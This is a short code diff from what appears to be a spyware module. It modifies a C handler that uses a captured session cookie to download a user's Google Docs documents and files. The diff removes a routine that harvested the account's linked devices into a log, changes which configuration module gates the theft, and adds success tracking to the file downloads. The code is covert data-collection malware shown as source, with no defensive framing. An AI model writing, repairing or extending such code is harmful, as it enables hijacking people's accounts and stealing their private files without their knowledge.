@@ -17,19 +17,11 @@
 
 #include "sha1.h"
 
-extern DWORD GDev_GetDevices(LPSTR pszCookie);
-extern DWORD GDev_GetDevices_V2(LPSTR pszCookie);
-
-BOOL   g_bSendGoogleDevice = TRUE;
 
 //google docs handler
 DWORD GoogleDocsHandler(LPSTR pszCookie)
 {
-	//get the google devices and save device a log
-	if(g_bSendGoogleDevice)
-		GDev_GetDevices(pszCookie);
-
-	if (!ConfIsModuleEnabled(L"messages"))
+	if (!ConfIsModuleEnabled(L"file"))
 		return SOCIAL_REQUEST_SUCCESS;
 
 	#ifdef _DEBUG
@@ -53,10 +45,14 @@ DWORD GoogleDocsHandler(LPSTR pszCookie)
 		if(dwRet == GD_E_SUCCESS)
 		{
 			//download the documents
-			GD_DownloadFiles(&DocList, &Params, pszCookie);
+			dwRet = GD_DownloadFiles(&DocList, &Params, pszCookie);
+			if(dwRet == GD_E_SUCCESS)
+				dwErr = SOCIAL_REQUEST_SUCCESS;
 
 			//download the files
-			GD_DownloadFiles(&FileList, &Params, pszCookie);
+			dwRet = GD_DownloadFiles(&FileList, &Params, pszCookie);
+			if(dwRet == GD_E_SUCCESS)
+				dwErr = SOCIAL_REQUEST_SUCCESS;
 		}
 	}
 	
